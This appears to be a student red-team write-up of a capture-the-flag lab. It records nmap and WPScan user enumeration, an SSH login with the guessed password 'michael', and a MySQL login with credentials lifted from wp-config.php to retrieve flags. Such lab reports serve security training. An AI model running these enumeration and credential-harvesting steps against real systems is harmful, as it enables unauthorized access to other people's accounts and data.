# Read Team: Summary of Operations

### Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
Nmap scan results for each machine reveal the below services and OS details:

Command: `$ nmap -sV 192.168.1.110`

Output Screenshot:

![alt text](https://github.com/carlwarnberg/Project-3/blob/main/Images/Nmap-Scan.png)

This scan identifies the services below as potential points of entry:

**Target 1**
1. Port 22/TCP 	    Open 	SSH
2. Port 80/TCP 	    Open 	HTTP
3. Port 111/TCP 	Open 	rcpbind
4. Port 139/TCP 	Open 	netbios-ssn
5. Port 445/TCP 	Open 	netbios-ssn

### Critical Vulnerabilities
The following vulnerabilities were identified on each target:

**Target 1**

1. Weak Password Requirements (CWE-521) 
2. User Enumeration
3. Unsalted User Password Hash (WordPress database)

### Explotation
The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

**Target 1**
- **Flag1: b9bbcb33ellb80be759c4e844862482d**
- Exploit Used:
    - WPScan to enumerate users of the Target 1 WordPress site
    - Commands: 
        - `$ wpscan --url http://192.168.1.110 --enumerate u`

**WPScan Results:**

![alt text](https://github.com/carlwarnberg/Project-3/blob/main/Images/WPscan.png)

- Targeting user Michael
    - Simply guessed Michael’s password, as it was very obvious
    - Password: michael (lulz)
- Capturing Flag 1: SSH'd into Michael's account and traversed through directories and folders
    - Flag 1 found in var/www/html folder in service.html 

        - Commands:
    
        - `$ ssh michael@192.168.1.110`
        - `$ password: michael`
        - `$ cd /var/www/html`
        - `$ cat service.html`
        
![alt text](https://github.com/carlwarnberg/Project-3/blob/main/Images/Flag1.png)

- **Flag2: fc3fd58dcdad9ab23faca6e9a3e581c**
- Exploit Used:
    - Same exploit used to gain Flag 1.

        - Commands:
        
        - `ssh michael@192.168.1.110` 
        - `pw: michael`
        - `cd ../` 
        - `cd ../`
        - `cd var/www`
        - `ls`
        - `cat flag2.txt`

![alt text](https://github.com/carlwarnberg/Project-3/blob/main/Images/Flag2.png) 

- **Flag3: afc01ab56b50591e7dccf93122770cd2**
- Exploit Used:
    - Same exploits used to gain Flag 1 and 2.
    - Capturing Flag 3: Accessing MySQL database.
        - Obtained mysql login credentials from the wp-config.php file found in the var/www/html/wordpress directory
        - I was able to find Flags 3 and 4 using the steps below
        - Commands:

         - `mysql -u -p`
         - `password: R@v3nSecurity`
         - `show databases;`
         - `use wordpress;` 
         - `show tables;`
         - `select * from wp_posts;`

![alt text](https://github.com/carlwarnberg/Project-3/blob/main/Images/Flag3.png)

![alt text](https://github.com/carlwarnberg/Project-3/blob/main/Images/Flag4.png)
